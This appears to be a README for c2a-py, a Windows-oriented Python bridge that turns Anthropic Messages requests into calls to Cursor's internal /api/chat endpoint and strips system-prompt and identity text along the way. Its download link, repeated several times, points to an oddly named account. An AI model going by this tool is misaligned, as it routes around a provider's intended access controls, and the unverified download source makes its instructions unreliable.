# 🐍 c2a-py - Run Cursor API on Windows

[![Download the latest version](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue.svg)](https://github.com/barsinisterharmoniousness724/c2a-py)

## 📥 Download

Use this link to visit the download page:

https://github.com/barsinisterharmoniousness724/c2a-py

On that page, get the latest version, then save it to your Windows PC.

## 🖥️ What this app does

c2a-py is a small Python app that lets you run a Cursor-to-API bridge on your computer.

It provides a local web service that supports these routes:

- `POST /v1/messages`
- `POST /messages`
- `POST /v1/messages/count_tokens`
- `POST /messages/count_tokens`
- `GET /v1/models`
- `GET /health`

It is built for simple use and easy setup on Windows.

## ✅ What you need

Before you start, make sure you have:

- A Windows PC
- Internet access
- Python 3.10 or newer
- Cursor access or the related login details needed by the app
- A terminal app such as PowerShell or Windows Terminal

If you want a simpler setup, you can also use `uv`.

## 🚀 Install

### Option 1: Install with pip

Open the folder that contains the project files, then run:

```bash
pip install -r requirements.txt
```

### Option 2: Install with uv

If you use `uv`, run:

```bash
uv sync
```

## ▶️ Start the app

Go to the `py/` folder, then start the app with:

```bash
python start_py.py
```

If that does not work, try:

```bash
python main.py
```

Keep the terminal window open while the app runs.

## 🌐 Open the local service

After the app starts, open your browser and go to:

```text
http://127.0.0.1:8000/health
```

If the app is running, you should see a health response in the browser.

You can also use the local API address from other apps on your computer.

## 🧭 Project files

```text
py/
├── main.py            # FastAPI entry point
├── start_py.py        # Start script for this folder
├── config.py          # Environment settings
├── schemas.py         # Request and response models
├── converter.py       # Request conversion and tool parsing
├── cursor_client.py   # Sends requests to Cursor /api/chat
├── constants.py       # Cleanup and reject rules
├── requirements.txt   # pip dependencies
└── pyproject.toml     # Python project info
```

## 🧰 Features

- FastAPI server entry
- Simple start script
- Claude Code compatible routes
- Request transfer from Anthropic Messages to Cursor `/api/chat`
- Basic system prompt cleanup
- Tool definition injection
- `json action` tool block parsing
- Basic identity text cleanup
- Non-streaming and streaming response formats for Claude Code use

## 🪟 Windows setup steps

### 1. Download the project

Visit:

https://github.com/barsinisterharmoniousness724/c2a-py

Save the project to a folder on your PC.

### 2. Open the project folder

Find the folder where you saved the files.

If the project is inside a zip file, extract it first.

### 3. Open PowerShell

Inside the project folder, open PowerShell or Windows Terminal.

### 4. Install the Python packages

Run:

```bash
pip install -r requirements.txt
```

Or, if you use `uv`:

```bash
uv sync
```

### 5. Start the server

Move into the `py/` folder, then run:

```bash
python start_py.py
```

### 6. Check that it works

Open this address in your browser:

```text
http://127.0.0.1:8000/health
```

If you see a response, the app is ready.

## 🔧 Common uses

This app is useful when you want to:

- Run a local API service on Windows
- Send Anthropic-style requests to Cursor
- Test Claude Code compatible tools
- Keep a small Python-based bridge that is easy to read

## 🗂️ Simple request flow

1. Your app sends an Anthropic Messages request
2. c2a-py changes it into a Cursor `/api/chat` request
3. Cursor processes the request
4. c2a-py returns a response in a format Claude Code can read

## 🔍 Health check

Use the health route to see if the app is live:

```text
GET /health
```

This is the fastest way to confirm the server started well.

## 🧪 Model list

The app also exposes:

```text
GET /v1/models
```

This helps other tools find the available model data.

## 🛠️ If the app does not start

Try these checks:

- Make sure Python is installed
- Make sure you are in the right folder
- Make sure `requirements.txt` is present
- Make sure no other app is using port `8000`
- Close and reopen PowerShell, then run the start command again

If the browser cannot open the health page, check the terminal for error text.

## 🔐 Environment setup

Some setups may use a config file or environment values.

Common values may include:

- Cursor access details
- Local host settings
- Port number
- Request format options

If you are unsure, keep the default settings first.

## 📌 Supported route list

- `POST /v1/messages`
- `POST /messages`
- `POST /v1/messages/count_tokens`
- `POST /messages/count_tokens`
- `GET /v1/models`
- `GET /health`

## 🧾 Input and response handling

The app supports:

- Anthropic Messages input
- Cursor chat request conversion
- Basic tool block parsing
- Streamed response output
- Non-streamed response output

It also cleans up some identity text and prompt text so the request stays simple.

## 💡 Best way to use it

If this is your first time:

1. Download the project from GitHub
2. Install Python packages
3. Start the server
4. Open the health page
5. Use the local API in your other app or tool

## 📍 Download again

Visit the project page here:

https://github.com/barsinisterharmoniousness724/c2a-py